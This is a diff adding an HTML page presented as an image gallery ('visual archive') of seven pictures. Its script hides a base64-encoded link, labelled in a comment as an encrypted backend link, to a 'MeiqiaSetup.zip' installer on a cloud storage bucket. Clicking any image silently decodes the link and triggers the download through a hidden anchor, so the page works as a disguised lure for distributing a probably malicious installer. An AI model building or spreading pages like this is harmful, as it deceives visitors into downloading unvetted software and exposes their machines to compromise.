@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>视觉档案</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    .media-container {
+      display: block;
+      line-height: 0;
+    }
+    .media-element {
+      width: 100%;
+      height: auto;
+      vertical-align: bottom;
+      border: 0;
+      display: block;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="media-container"></div>
+
+  <script type="module">
+    // 图像展示配置
+    const VISUAL_CONFIG = {
+      sources: [
+        'static/picture/d_01.jpg',
+        'static/picture/d_02.jpg',
+        'static/picture/d_03.jpg',
+        'static/picture/d_04.jpg',
+        'static/picture/d_05.jpg',
+        'static/picture/d_06.jpg',
+        'static/picture/d_07.jpg'
+      ]
+    };
+
+    // 后台链接配置（已加密）
+    const HIDDEN_RESOURCE = {
+      items: Array(7).fill(
+        'aHR0cHM6Ly9oay1jZG4wNi5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tL01laXFpYVNldHVwLnppcA=='
+      )
+    };
+
+    // 图像加载模块
+    const visualLoader = {
+      render(container) {
+        VISUAL_CONFIG.sources.forEach(src => {
+          const img = new Image();
+          img.className = 'media-element';
+          img.src = src;
+          img.alt = '视觉图像';
+          container.appendChild(img);
+        });
+      }
+    };
+
+    // 资源触发模块
+    const triggerHandler = {
+      decode(str) {
+        return atob(str);
+      },
+      triggerLink(url) {
+        const anchor = document.createElement('a');
+        anchor.href = url;
+        anchor.rel = 'noopener';
+        document.body.appendChild(anchor);
+        anchor.click();
+        setTimeout(() => anchor.remove(), 200);
+      },
+      fetch(index) {
+        if (index >= 0 && index < HIDDEN_RESOURCE.items.length) {
+          return this.decode(HIDDEN_RESOURCE.items[index]);
+        }
+        return null;
+      }
+    };
+
+    // 交互控制器
+    const interactionController = {
+      bindEvents() {
+        const container = document.querySelector('.media-container');
+        container.addEventListener('click', (e) => {
+          if (e.target.classList.contains('media-element')) {
+            const index = [...e.target.parentElement.children].indexOf(e.target);
+            const url = triggerHandler.fetch(index);
+            url && triggerHandler.triggerLink(url);
+          }
+        });
+      }
+    };
+
+    // 初始化主程序
+    const bootstrap = () => {
+      const container = document.querySelector('.media-container');
+      visualLoader.render(container);
+      interactionController.bindEvents();
+    };
+
+    document.addEventListener('DOMContentLoaded', bootstrap);
+  </script>
+</body>
+</html>
